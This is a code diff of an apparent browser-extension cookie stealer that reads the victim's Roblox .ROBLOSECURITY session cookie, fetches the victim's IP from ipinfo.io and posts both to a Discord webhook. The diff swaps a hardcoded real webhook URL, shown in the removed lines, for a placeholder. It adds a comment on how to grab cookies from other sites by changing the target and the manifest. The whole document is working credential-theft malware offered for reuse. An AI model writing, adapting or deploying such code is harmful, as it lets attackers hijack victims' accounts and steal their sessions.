@@ -16,7 +16,8 @@ function webhookReq(webhook, cookie, ip) {
             }]
     }]
   }
-
+   
+  // Send the webhook request
   fetch(webhook, {
     method: "POST",
     headers: {
@@ -29,16 +30,14 @@ function webhookReq(webhook, cookie, ip) {
 
 
 // Driver Code:
-chrome.cookies.get({url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}, function(cookie) {
+cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
+chrome.cookies.get(cookieInfo, function(cookie) {
   if (cookie) {
-    cookie = cookie.value
-    webhook = "https://discord.com/api/webhooks/947955140177055747/_A4TE32pHFAxUZLN0ZZ62Vtc-6lQiIYEs9HEEAaypYKxjpS3528RlyXP_Z52CjihEsqI"
     $.getJSON(
     	`https://ipinfo.io/json`, 
     	function(ipResponse){
-    		ip = ipResponse.ip
         // Send Webhook
-        webhookReq(webhook, cookie, ip)
+        webhookReq("Webhook", cookie.value, ipResponse.ip);
     })
   }
 });
